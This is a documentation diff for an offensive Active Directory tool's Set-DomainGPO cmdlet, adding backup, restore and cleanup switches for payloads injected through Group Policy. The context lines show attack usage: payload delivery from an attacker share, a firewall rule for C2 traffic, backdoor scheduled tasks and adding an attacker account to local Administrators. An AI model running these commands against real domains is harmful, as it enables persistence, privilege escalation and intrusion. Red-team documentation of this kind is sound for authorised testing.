@@ -684,6 +684,15 @@ Modifies Group Policy Objects for persistence and privilege escalation.
 | **Deploy File** | `-DeployFile` | Copy file via GPO | Payload delivery |
 | **Add Firewall Rule** | `-AddFirewallRule` | Create firewall rule via GPO | Network access |
 | **Sync SYSVOL** | `-SyncSYSVOL` | Sync AD permissions to SYSVOL | Fix permissions |
+| **Export (Backup)** | `-Export` | Snapshot GPO (AD attrs + full SYSVOL tree) to JSON | Backup before change |
+| **Import (Restore)** | `-Import` | Restore GPO server-side from JSON backup | Cleanup |
+| **Remove Scheduled Task** | `-RemoveScheduledTask -TaskName` | Surgically remove an injected task | Cleanup |
+| **Remove Local Group Member** | `-RemoveLocalGroupMember -LocalGroup -MemberToAdd` | Remove an injected member | Cleanup |
+| **Remove Service** | `-RemoveService -ServiceName` | Remove an injected service | Cleanup |
+| **Remove Deployed File** | `-RemoveDeployedFile -FileName` | Remove an injected file deployment | Cleanup |
+| **Remove Firewall Rule** | `-RemoveFirewallRule -RuleName` | Remove an injected firewall rule | Cleanup |
+| **Remove Startup Script** | `-RemoveStartupScript -ScriptName` | Remove an injected startup script | Cleanup |
+| **Remove Logon Script** | `-RemoveLogonScript -ScriptName` | Remove an injected logon script | Cleanup |
 
 ### Syntax
 
@@ -700,6 +709,15 @@ Set-DomainGPO
     [-AddService] [-ServiceName <String>] [-BinaryPath <String>] [-ServiceDisplayName <String>] [-StartType <String>] [-ServiceAccount <String>]
     [-DeployFile] [-SourceFile <String>] [-DestinationPath <String>] [-FileAction <String>]
     [-AddFirewallRule] [-RuleName <String>] [-RuleDirection <String>] [-RuleAction <String>] [-RuleProtocol <String>] [-RuleLocalPort <String>] [-RuleRemotePort <String>] [-RuleRemoteAddress <String>] [-RuleProgram <String>]
+    [-Export <String>]
+    [-Import <String>]
+    [-RemoveScheduledTask -TaskName <String>]
+    [-RemoveLocalGroupMember -LocalGroup <String> -MemberToAdd <String>]
+    [-RemoveService -ServiceName <String>]
+    [-RemoveDeployedFile -FileName <String>]
+    [-RemoveFirewallRule -RuleName <String>]
+    [-RemoveStartupScript -ScriptName <String>]
+    [-RemoveLogonScript -ScriptName <String>]
     [-SyncSYSVOL]
     [-NoSYSVOL]
     [-PassThru]
@@ -743,7 +761,27 @@ Set-DomainGPO -Identity "Deploy Policy" -DeployFile -SourceFile "\\attacker\shar
 
 # Add firewall rule allowing C2 traffic
 Set-DomainGPO -Identity "FW Policy" -AddFirewallRule -RuleName "Allow Updates" -RuleDirection Outbound -RuleAction Allow -RuleProtocol TCP -RuleRemotePort 443
+
+# --- Backup / Revert (operator-driven, same idiom as Set-CertificateTemplate) ---
+
+# Back up the GPO BEFORE modifying it (AD attributes + full SYSVOL tree -> one JSON)
+Set-DomainGPO -Identity "Default Domain Policy" -Export ".\DDP_backup.json"
+
+# Restore the GPO server-side from the backup (rewrites SYSVOL, deletes injected files,
+# restores extension attributes/version). Does NOT undo effects already applied on clients.
+Set-DomainGPO -Identity "Default Domain Policy" -Import ".\DDP_backup.json"
+
+# Surgically remove a single injected payload by name (no JSON needed)
+Set-DomainGPO -Identity "Backdoor Policy" -RemoveScheduledTask -TaskName "Update"
+Set-DomainGPO -Identity "Admin Policy" -RemoveLocalGroupMember -LocalGroup "Administrators" -MemberToAdd "CONTOSO\attacker"
+Set-DomainGPO -Identity "Service Policy" -RemoveService -ServiceName "UpdateSvc"
+Set-DomainGPO -Identity "Script Policy" -RemoveStartupScript -ScriptName "update.bat"
 ```
+
+> **Note:** Backup/Revert is **operator-driven** — there is no automatic backup. Run `-Export`
+> before you modify a GPO. `-Import` and the `-Remove*` switches restore the **GPO definition
+> server-side**; they do not undo changes a Group Policy Preference already applied on clients
+> (e.g. a user already added to a local group). Revert those separately.
 
 ---
 
